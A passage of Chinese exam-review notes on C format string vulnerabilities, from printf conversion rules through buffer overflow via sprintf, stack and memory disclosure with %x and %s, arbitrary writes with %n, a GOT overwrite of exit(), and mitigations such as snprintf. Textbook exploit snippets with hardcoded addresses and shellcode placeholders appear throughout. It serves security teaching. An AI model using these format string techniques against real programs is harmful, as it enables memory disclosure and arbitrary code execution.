<p>（5）当<strong>参数过多</strong>时，<strong>多余的将被忽略。</strong>而当<strong>参数不足</strong>时，则<strong>结果是未定义的。</strong></p>
<p>（6）一个转换规范组成：</p>
<p><strong>可选域：</strong>标志、宽度、精度以及长度修饰符</p>
<p><strong>必需域：</strong>转换指示符，按照下面的格式</p>
<p>%[<em>flags</em>] [<em>width</em>] [.<em>precision</em>] [{<em>length modifier</em>}] <em>conversion-specifier.</em></p>
<p>例如%-10.8ld：-是标志位，10代表宽度，8代表精度，l是长度修饰符，d是转换指示符。这个转换规范将一个<strong>long int型的参数按照十进制格式打印</strong>，在一个<strong>最小宽度为10个字符的域中保持最少8位左对齐。</strong>最简单的转换规范仅仅包含一个%和一个转换指示符（例如%s）。</p>
<p>4.宽度</p>
<p>（1）宽度是一个用来<strong>指定输出字符的最小个数的十进制非负整数。如果输出的字符个数比指定的宽度小，就用空白字符补足。</strong></p>
<p>（2）如果指定的宽度较小<strong>也不会引起输出域的截断</strong>。如果转换的结果比域宽大，则<strong>域会被扩展以容纳转换结果。</strong></p>
<p>（3）如果使用星号（<em>）来指定宽度，则宽度将<strong>由参数列表中的一个int型的值</strong>提供。在参数列表中，宽度参数必须置于*<em>被格式化的值之前。</em></em></p>
<p>5.精度</p>
<p>（1）精度是用来指示打印字符个数、小数位数或者有效数字个数的非负十进制整数。</p>
<p>（2）精度域可能<strong>会引起输出的截断或浮点值的舍入。</strong></p>
<p>（3）如果精度域是一个星号<strong>（*）</strong>，那么它的值就由参数列表中的一个int参数提供。</p>
<p>（4）在参数列表中，精度参数<strong>必须置于被格式化的值之前。</strong></p>
<h3 id="对格式化输出函数的漏洞利用"><a href="#对格式化输出函数的漏洞利用" class="headerlink" title="对格式化输出函数的漏洞利用"></a>对格式化输出函数的漏洞利用</h3><p>当使用的格式字符串（或部分字符串）是<strong>由用户或其他非信任来源提供的时候</strong>，就有可能出现格式字符串漏洞。当格式化输出例程对一个数据结构进行越界写时就可能会导致缓冲区溢出。</p>
<p>1.缓冲区溢出：向字符数组中<strong>写入数据的格式化输出函数</strong>，<strong>会假定存在任意长度的缓冲区</strong>，从而导致它们易于造成缓冲区溢出。</p>
<p>考试练习题：</p>
<p>缓冲区溢出漏洞，发生于将%s替换成用户提供的字符串user（可能是恶意数据）时。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;Wrong command: %s\n&quot;</span>, user)</span><br></pre></td></tr></table></figure>

<p>因使用sprintf()所导致的缓冲区溢出漏洞，该漏洞发生于将转换指示符%s替换成用户提供的字符串。任何长度大于<strong>495字节</strong>的字符串都会导致越界写<strong>（512字节-16个字符字节-1个空字节）。</strong></p>
<p>2.可伸展的缓冲区</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> outbuf[<span class="number">512</span>];</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(buffer,<span class="string">&quot;ERR Wrong command: %.400s&quot;</span>,user);</span><br><span class="line"><span class="built_in">sprintf</span>(outbuf, buffer); <span class="comment">// 栈溢出，控制权转移给shellcode</span></span><br></pre></td></tr></table></figure>

<ul>
<li>sprintf(buffer,”ERR Wrong command: %.400s”,user)：sprintf()调用并不会被直接利用，因为转换指示符%.400s限制了仅能写入400字节。</li>
<li>sprintf(outbuf, buffer)：同样的调用可被用于间接地攻击第4行中的sprintf()调用。例如用户通过使用下述值：%497d\x3c\xd3\xff\xbf<nops><shellcode>，在第3行调用的sprintf()直接将该字符串插入缓冲区。然后这个缓冲区数组将被作为格式字符串参数传递给在<strong>第4行</strong>被第二次调用的sprintf()。</li>
</ul>
<p>（1）格式规范**%497d**指示函数sprintf()<strong>从栈中读出一个假的参数并向缓冲区中写入497个字符。</strong></p>
<p>（2）包括格式字符串中的普通字符在内，现在写入的字符总数<strong>已经超过了outbuf的长度4个字节。</strong></p>
<p>（3）用户输入可被操纵用于<strong>覆写返回地址</strong>，也就是<strong>拿恶意格式</strong>字符串参数中提供的利用代码的地址<strong>（0xbfffd33c）去覆盖该地址。</strong></p>
<p>（4）在当前函数退出时，控制权将以与栈粉碎攻击相同的方式转移给利用代码。</p>
<p>（5）这个例子中的编程缺陷是由于在第4行不恰当地调用了sprintf()函数来实现字符串的复制功能，其实这里应该使用strcpy()或strncpy()。<strong>如果在第4行使用strcpy()来代替sprintf()，就能够消除这个漏洞。</strong></p>
<p>3.输出流：将结果输出到流而不是输出到文件中的格式化输出函数<strong>（例如printf())<strong>也可能会</strong>导致格式字符串漏洞。</strong></p>
<p>int func(char *user){printf(user);}</p>
<p>如果用户能够部分或者全部<strong>控制用户参数</strong>，那这个程序就会被利用从而导致程序崩溃、查看栈内容、查看内存内容或覆写内存。</p>
<p>4.使程序崩溃</p>
<p>（1）格式字符串漏洞通常是在<strong>程序崩溃</strong>的时候才被发现。Windows中，读取一个<strong>未映射的地址</strong>会崩溃；Unix中，存取<strong>无效指针</strong>会崩溃。</p>
<p>（2）（多次考）当用printf(“%s%s%s%s%s%s%s%s%s%s%s%s”)格式字符串调用格式化输出函数时，<strong>就会触发无效指针存取或未映射的地址读取。</strong>转换指示符**%s显示执行栈上相应参数所指定的地址的内存。<strong>由于在这个例子中没有提供字符串参数，因此</strong>printf()可以读取栈中任意内存位置，直到格式字符串耗尽或者遇到一个无效指针或未映射地址为止。**</p>
<p>5.查看栈内容：攻击者还可以利用格式化输出函数来检查内存的内容。</p>
<p>（1）反汇编printf()调用：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2081.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2082.png" alt="image.png"></p>
<p>（2）过程：</p>
<p><strong>①format字符串0xe0f84201的地址</strong>出现在内存中的位置恰好位于参数值1、2、3之前。</p>
<p>②紧邻参数之后的内存中包含有<strong>调用函数的自动变量</strong>，后者包括<strong>format字符数组0x2e253038的内容</strong>。</p>
<p>③本例中的格式字符%08x.%08x.%08x.%08指示函数printf()从栈中取回4个参数并将它们以8位十六进制数的形式显示出来。随着每一个参数被相应的格式规范所耗用，参数指针的值<strong>也根据参数的长度不断递增。</strong></p>
<p>④格式字符串中的每一个别%08x都会从参数指针指定的位置<strong>读入一个被解释为int型的值。</strong>通过每一个格式字符串输出的这些值被显示在相应格式字符串下面。第四个“整数”包含<strong>格式字符串%08x的ASCII码的前四个字节。</strong></p>
<p>（3）包括printf()在内的格式化输出函数使用一个内部变量来标志下一个参数的位置。<strong>栈的内容或栈指针并没有被修改，因此执行将按预期继续进行下去</strong>，直到控制权返回给调用程序。<strong>格式化输出函数将以这种形式持续显示内存中的其他内容，直到在格式字符串中遇到一个空字节。</strong></p>
<p>（4）在显示完当前执行函数的剩余自动变量之后，<strong>printf()将显示当前执行函数的栈帧</strong>（包括当前执行函数的返回地址和参数）。由于printf()在内存中是按顺序“移动”的，所以它将会显示调用函数的同样的信息。一个函数调用一个函数，以此类推，直至整个栈。</p>
<p>（5）使用这个技术，有可能重建大部分的栈内存。攻击者可以使用这些数据来决定程序的偏移量或其他信息，从而进一步利用该漏洞或其他漏洞。</p>
<p>6.查看内存内容</p>
<p>（1）转换指示符%s显示<strong>参数指针所指定的地址的内存</strong>，将它作为一个ASCII字符串处理，直至遇到一个空字符。如果攻击者能够通过操纵这个参数指针来<strong>引用一个特定的地址</strong>，那么转换指示符%s将会<strong>输出该位置的内存内容</strong>。参数指针可以<strong>使用转换指示符%x进行前向移动。</strong></p>
<p>（2）它所能移动的距离<strong>仅受格式字符串的大小所限制</strong>。攻击者就能够<strong>在调用函数的自动变量中插入一个地址。</strong>如果格式字符串被存储为一个自动变量，那么地址就能被插入在字符串的开始部分。攻击者可以按照下面的格式创建一个格式字符串来查看指定地址的内存：<em>address advance-argptr</em> %s</p>
<p>（3）查看某个具体位置的内存</p>
<p>考试练习题：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2083.png" alt="image.png"></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2084.png" alt="image.png"></p>
<ul>
<li>攻击者可以使用转换指示符%s显示参数指针所指定的地址的内存，将它作为一个ASCII字符串处理，直至遇到一个空字符。参数指针可以使用转换指示符%x进行前向移动，它所能移动的距离仅受<strong>格式字符串的大小所限制。</strong></li>
<li>当攻击者提供的格式字符串为\xdc\xf5\x42\x01%x%x%x%s，printf()将显示<strong>从0x0142f5dc开始的内存直到遇到字节\0结束。</strong>3个转换指示符%x应该使参数指针从格式字符串的开始位置<strong>前进12个字节。</strong></li>
<li>这个内存空间可以通过对函数printf()的调用之间的地址步进而被映射。查看任意地址的内存的能力有助于攻击者开发其他更具破坏性的利用，在受害计算机上执行任意的代码就是一个例子。</li>
</ul>
<p>7.覆写内存</p>
<p>（1）格式化输出函数之所以具有特别的危险性是因为<strong>大多数程序员还没有意识到其破坏力。</strong>在那些<strong>整型值和地址</strong>具有同样大小平台上，<strong>向任意地址写入整型值的能力</strong>可被用于在受害系统上执行任意的代码。最初转换指示符**%n<strong>是用来帮助</strong>排列格式化输出字符串<strong>的。它将</strong>字符数目成功地输出到以参数的形式提供的整数地址中。**</p>
<p>（2）例如，在执行下面的代码片断后：int i;printf(“hello%n\n”, (int *)&amp;i);变量i被赋值为5，因为在遇到转换指示符%n之前<strong>一共写入了5个字符（hello）</strong>。通过使用转换指示符%n ，攻击者可以<strong>向指定地址中写入一个整数值。</strong>为了利用这个安缺陷，攻击者需要向任意一个地址中写入－个任意值。</p>
<p>（3）调用：printf(“\xdc\xf5\x42\x01%08x.%08x.%08x%n”);将<strong>代表输出字符个数的整数值</strong>写入地址<strong>0x0142f5dc中。</strong>写入的值<strong>28</strong>。等于8字符宽的十六进制域（乘以3）的值加上4个地址字节的值。攻击者用某些shellcode的地址<strong>来覆写地址。</strong></p>
<p>（4）如果攻击者能够控制格式字符串，那么他就能通过使用具有具体的宽度或精度的转换规范来控制写入的字符个数。</p>
<p>考试题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%10u%n&quot;</span>, <span class="number">1</span>, &amp;i); <span class="comment">/* i = 10 */</span></span><br><span class="line">**<span class="built_in">printf</span>(<span class="string">&quot;%100u%n&quot;</span>, <span class="number">1</span>, &amp;i); **<span class="comment">/*** i = 100 */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>每一个格式字符串都耗用两个参数：<strong>转换指示符%u所使用的整数值、输出的字符个数</strong></li>
<li>问你第三行输出的i用十六进制表示为：64</li>
</ul>
<p>（5）在大多数复杂指令集计算机架构中，可以按如下方式写一个任意的地址：<strong>写入4个字节、递增该地址、写入另外4个字节。</strong>这项技术对于覆写目标内存之后的3个字节有一个副作用。</p>
<p>（6）举例</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> exploit[<span class="number">1024</span>] = <span class="string">&quot;\x90\x90\x90...\x90&quot;</span>;</span><br><span class="line"><span class="type">char</span> format[<span class="number">1024</span>];</span><br><span class="line"><span class="comment">// 定义了四套哑整数/地址对步进参数指针指令来覆写地址</span></span><br><span class="line"><span class="built_in">strcpy</span>(format, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xdc\xf5\x42\x01&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xdd\xf5\x42\x01&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xde\xf5\x42\x01&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;\xdf\xf5\x42\x01&quot;</span>);</span><br><span class="line"><span class="comment">// 第3579行在与转换规范%u对应的格式字符串中**插入了哑整型参数。**</span></span><br><span class="line"><span class="comment">// 第46810行指定了一个值序列，后者是用**利用代码的地址去覆写0x0142f5dc**</span></span><br><span class="line"><span class="comment">//（栈上的一个返回地址）处的地址所必需的。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">61</span>; i++) &#123;</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;%x&quot;</span>);&#125;</span><br><span class="line"><span class="comment">// 第11~13行写入适当数目的%x转换规范，将**参数指针步进到格式字符串的起点以及第一个哑整数/地址对。**</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* code to write address goes here */</span></span><br><span class="line"><span class="built_in">printf</span>(format)</span><br></pre></td></tr></table></figure>

<ul>
<li>考创建的字符串序列格式：<strong>四套哑整数&#x2F;地址对，用于步进参数指针的指令，用于覆写地址的指令。</strong></li>
</ul>
<p>printf(“\xdc\xf5\x42\x01%08x.%08x.%08x%n”);  还可以将特定的整数值写入地址0x0142f5dc中。参数在放入栈的时候，根据大小从栈顶往栈底放；因此参数开头的地址在栈顶，会被认为是最后的参数，对应%n放入的地方。</p>
<p>进一步地，可以有<strong>任意写</strong>：<strong>对某地址写入4字节、递增该地址、再写入另外4字节</strong>。</p>
<p>8.按四个步骤写一个地址</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2085.png" alt="image.png"></p>
<p>（1）每一次地址递增的时候，都会在<strong>低内存中保留一个字节的尾值</strong>。这个字节在小尾端架构中<strong>是低位字节</strong>，而在大尾构中<strong>则为高位字节</strong>。这个过程可用于<strong>通过一系列小整数的值（＜255）来实现写一个大整数值（一个地址）</strong>的目的。这个过程还可以颠倒过来，即<strong>还可以在地址递减时从高位内存写到低位内存。</strong></p>
<p>（2）格式化输出调用<strong>仅仅执行每格式字符串的单一写。</strong>在对格式化输出函数的单次调用中，<strong>还可以执行多次写。</strong></p>
<p>练习题：（这种类似的计算要学会，考过问你写入什么）</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2086.png" alt="image.png"></p>
<ul>
<li>写入foo的内容为<strong>0x80402010（小尾端架构）</strong>。在对格式化输出函数的单次调用中执行多次写时，若第一次写入了0x20(%32u%n)，第二次想写入0x10，正确的写法是**%240u%n。<strong>将多次写与单格式字符串相结合的唯一区别在于，随着每一个字符的输出，计数器的值不断增加。printf(“%16u%n%16u%n%32u%n%64u%n”)，</strong>第一个%16u%n字符序列向指定地址中写入的值是16，但第二个%16u%n则写32字节，因为计数器没有被重置。**</li>
</ul>
<p>9.用于<strong>覆写一个地址</strong>的利用代码</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> already_written, width_field;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> write_byte;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">already_written = <span class="number">506</span>;</span><br><span class="line"><span class="comment">// first byte</span></span><br><span class="line">write_byte = <span class="number">0x3C8</span>;</span><br><span class="line">already_written %= <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">width_field = (write_byte - already_written) % <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span> (width_field &lt; <span class="number">10</span>) width_field += <span class="number">0x100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%%%du%%n&quot;</span>, width_field);</span><br><span class="line"><span class="built_in">strcat</span>(format, buffer);</span><br><span class="line"><span class="comment">// 练习题只给到这里，问代码作用，**覆写一个地址的第一个字节**</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// second byte</span></span><br><span class="line">write_byte = <span class="number">0x3fA</span>;</span><br><span class="line">already_written += width_field;</span><br><span class="line">already_written %= <span class="number">0x100</span>;</span><br><span class="line">width_field = (write_byte - already_written) % <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span> (width_field &lt; <span class="number">10</span>) width_field += <span class="number">0x100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%%%du%%n&quot;</span>, width_field);</span><br><span class="line"><span class="built_in">strcat</span>(format, buffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// third byte</span></span><br><span class="line">write_byte = <span class="number">0x442</span>;</span><br><span class="line">already_written += width_field;</span><br><span class="line">already_written %= <span class="number">0x100</span>;</span><br><span class="line">width_field = (write_byte - already_written) % <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span> (width_field &lt; <span class="number">10</span>) width_field += <span class="number">0x100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%%%du%%n&quot;</span>, width_field);</span><br><span class="line"><span class="built_in">strcat</span>(format, buffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fourth byte</span></span><br><span class="line">write_byte = <span class="number">0x501</span>;</span><br><span class="line">already_written += width_field;</span><br><span class="line">already_written %= <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">width_field = (write_byte - already_written) % <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">if</span> (width_field &lt; <span class="number">10</span>) width_field += <span class="number">0x100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buffer, <span class="string">&quot;%%%du%%n&quot;</span>, width_field);</span><br><span class="line"><span class="built_in">strcat</span>(format, buffer);</span><br></pre></td></tr></table></figure>

<p>（1）代码使用了三个无符号整数：already_written，width_field，write_byte。变量write_byte中包含<strong>下一个将要写入的字节值</strong>。already_written用于<strong>存储输出的字符个数</strong>（应该<strong>等于格式化输出函数的输出计数器的值</strong>），width_field中存储<strong>有转换规范%n所需要的宽度域的值。</strong></p>
<p>（2）所需的宽度是<strong>由待写字节的值对0x100（不包括更大的宽度）取模再减去已经输出的字符数。</strong>区别在于<strong>输出的字符数需要将输出计数器从当前值增加到所需要的值</strong>。在每一次写入后，前一个转换规范中的宽度值被<strong>加上已写入的字节数</strong>。</p>
<p>（3）该代码创建的输出字符串格式为：**%% width u% %n。**</p>
<h3 id="栈随机化"><a href="#栈随机化" class="headerlink" title="栈随机化"></a>栈随机化</h3><p>1.背景：在Linux下，栈的起始地址为0xC0000000并且朝低内存方向增长。<strong>极少数Linux栈地址中包含空字节，从而容易使它们被插入格式字符串。</strong>许多Linux变体中包含有某种栈随机化机制。这种机制使得<strong>很难预测栈上信息的位置</strong>，包括<strong>返回地址和自动变量</strong>的位置，这是通过向栈中<strong>插入随机的间隙实现的</strong>。</p>
<p>2.阻碍栈随机化：尽管栈随机化<strong>加大了漏洞利用的难度</strong>，<strong>但它并不能完全阻止这种情况的发生。</strong>例如，格式字符串漏洞利用需要这样的一些值：要覆写的地址，shell code的地址，参数指针和格式字符串起始地址之间的距离，在第一个转换规范%u之前格式化输出函数已经写入的字节数。</p>
<p>3.待覆写地址：<strong>可以覆写在程序正常执行中、控制权将被转移到的函数的GOT入口或其他地址。</strong>覆写GOT入口的优势在于它独立于诸如栈和堆这样的系统变量。</p>
<p>4.Shellcode的地址：基于Windows的利用中假设向栈的自动变量中插入了一段shellcode。对于实现栈随机化的系统，想找到这个地址很困难。然而shellcode同样可以插入到数据段或堆上的变量中，这就比较容易找到了。</p>
<p>5.距离：攻击者必须确定<strong>参数指针和格式字符串的起始位置在栈中的距离</strong>。它们之间的相对距离却是不变的。计算参数指针与格式字符串的起始位置之间的距离并且插入所需数目的%x格式转换规范并不难做到。</p>
<p>6.以双字的格式写地址：基于Windows的利用<strong>将一个shellcode的地址分成四次每次写入一个字节，各次调用之间对地址进行递增</strong>。如果由于对齐的要求或者其他原因造成这种操作不可能，仍然可以通过向地址中一次写入一个字甚至全部内容来实现。</p>
<p>7.Linux利用变体</p>
<p>练习题：<strong>exit()函数的GOT入口的地址</strong>被覆写为shellcode的地址，所以当调用exit()终止程序时，控制权会移交给shellcode。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">1024</span>] = </span><br><span class="line"><span class="string">&quot;\x90\x09\x09\x09\x09\x09/bin/sh&quot;</span>; <span class="comment">// 静态变量向数据段中插入一个shellcode</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> format_str[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(format_str, <span class="string">&quot;\xaa\xaa\xaa\xaa&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format_str, <span class="string">&quot;\xb4\x9b\x04\x08&quot;</span>); </span><br><span class="line"><span class="comment">// **exit()函数的GOT入口的地址**被连接到格式字符串</span></span><br><span class="line"><span class="built_in">strcat</span>(format_str, <span class="string">&quot;\xcc\xcc\xcc\xcc&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(format_str, <span class="string">&quot;\xb6\x9b\x04\x08&quot;</span>);</span><br><span class="line"><span class="comment">// 该地址被+2后也连接到格式字符串</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line"><span class="built_in">strcat</span>(format_str, <span class="string">&quot;%x&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* code to write address goes here */</span></span><br><span class="line"><span class="built_in">printf</span>(format_str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">// 当调用exit()终止程序时，控制权会移交给shellcode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>8.直接参数存取</p>
<p>（1）Single UNIX规范[IEEE 04]<strong>允许转换被应用于参数列表中的格式之后的第n个参数上，而不是应用到下一个未使用的参数上。</strong>转换指示符%将被序列所代替，%<em>n</em>$,其中n是一个1到{NL_ARGMAX}范围内的十进制整数，它指定了参数的位置。</p>
<p>（2）格式既可以包含数字式，也可以包含非数字式的参数转换规范，但不允许二者同时出现。数字式的:%<em>n</em>$ and *<em>m</em>$；非数字式的:% and *。%%与%<em>n</em>$混合使用是个例外。在一个格式字符串中混用数字式和非数字式参数规范会导致未定义的结果。</p>
<p>（3）当使用数字式参数规范时，要想指定第n个参数，格式字符串中所有从第一个到第n-1个前导参数都要被指定。在包含有如%n$形式的转换规范的格式字符串中，参数列表中的数字式参数可视需要被从格式字符串中引用多次。</p>
<p>（4）直接参数存取例子</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i, j, k = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4$5u%3$n%5$5u%2$n%6$5u%1$n\n&quot;</span>,&amp;k,&amp;j,&amp;i,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i=%d,j=%d,k=%d\n&quot;</span>,i,j,k);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Output:</span></span><br><span class="line"><span class="comment">5 6 7</span></span><br><span class="line"><span class="comment">**i=5,j=10,k=15**（练习题问输出）</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<ul>
<li>printf(“%4$5u%3$n%5$5u%2$n%6$5u%1$n\n”,&amp;k,&amp;j,&amp;i,5,6,7);<br>printf(“i&#x3D;%d,j&#x3D;%d,k&#x3D;%d\n”,i,j,k);<br>对printf()函数的调用导致以5个字符的列宽将值<strong>567打印出来。</strong>printf()打印出赋给变量i,j,k的值，这些值代表了在<strong>上一次调用printf()的基础上输出计数器的增加值。</strong></li>
<li>第一个转换规范%4$5u：获得第4个参数（即常量5），并<strong>将输出格式化为无符号的十进制整数</strong>，宽度为5。</li>
<li>第二个转换规范%3$n：将当前输出计数器的值（5）<strong>写到第三个参数(&amp;i)所指定的地址。</strong></li>
<li>%5$5u的作用：获得第5个参数（即常量6），并<strong>将输出格式化为无符号的十进制整数</strong>，宽度为5。</li>
<li>%1$n的作用：将当前输出计数器的值（7）<strong>写到第一个参数(&amp;k)所指定的地址。</strong></li>
</ul>
<h3 id="缓解策略-2"><a href="#缓解策略-2" class="headerlink" title="缓解策略"></a>缓解策略</h3><p>由于现在的代码体系<strong>不可能改变库(移除%n)，不允许动态格式字符串。</strong></p>
<p>策略：</p>
<p>（1）<strong>限制写入字节数。</strong>使用%40s而不是%s，可以通过使用<strong>更安全的函数</strong>实现，比如snprintf、vsnprintf</p>
<p>（2）使用更安全的<strong>函数规范</strong></p>
<p>（3）使用<strong>静态分析（比如词法分析工具）</strong></p>
<p>（4）<strong>静态污点分析</strong></p>
<p>（5）<strong>限制可变函数的参数数量</strong>（用一个变参控制）</p>
<p><strong>（6）静态二进制分析</strong></p>
<p>1.动态格式字符串</p>
<p><strong>这个程序是可以免于受到格式字符串利用的威胁的：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span> &#123;</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> format[<span class="number">256</span>] = <span class="string">&quot;%d * %d = &quot;</span>; </span><br><span class="line"></span><br><span class="line">x = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">y = atoi(argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">3</span>], <span class="string">&quot;hex&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// 使用第三个参数来指示程序如何对结果进行格式化。</span></span><br><span class="line"><span class="comment">// 如果是字符串“hex”，那么将%x将结果显示为16进制，否则将%d将结果显示为10进制。</span></span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;0x%x\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">strcat</span>(format, <span class="string">&quot;%d\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(format, x, y, x * y);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.限制字节写入</p>
<p>（1）缓冲区溢出可以通过<strong>严格控制这些函数写入的字节数</strong>来避免。写入的字节数可以通过指定一个精度域作为%s转换规范的一部分进行控制。例如不使用sprintf(buffer, “Wrong command:%s\n”, user);而是使用sprintf(buffer, “Wrong command:<strong>%.495s\n</strong>“, user);</p>
<p>（2）<strong>精度域指定了针对%s转换所要写入的最大字节数。</strong>在这个例子中静态字符串“贡献”了17个字节。精度域为495确保结果字符串可以适合于512字节的缓冲。</p>
<p>（3）另一种方式是使用<strong>更安全版本的格式化输出库函数，</strong>它们不容易产生缓冲区溢出问题。例如<strong>snprintf()比sprintf()更好，vsnprintf()替代vsprintf()。</strong>这些函数指定了<strong>写入的最大字节数</strong>（包括末尾的空字节在内）。</p>
<p>（4）函数<strong>asprintf()和vasprintf()<strong>可以用于取代sprintf()和vsprintf()。这些函数为</strong>字符串分配足够大的空间以容纳包括末尾空字符在内的输出内容，</strong>并通过第一个参数返回指向它的指针。这些函数都是GNU的扩展函数，在C或POSIX标准中并没有定义。*BSD系统也支持这些函数。</p>
<p>3.ISO&#x2F;IEC WDTR 24731</p>
<p>（1）具有增强的安全性的函数：fprintf_s(),printf_s(),snprintf_s(),sprintf(),vfprintf_s(),vprintf_s(),vsnprintf_s(),vsprintf_s().</p>
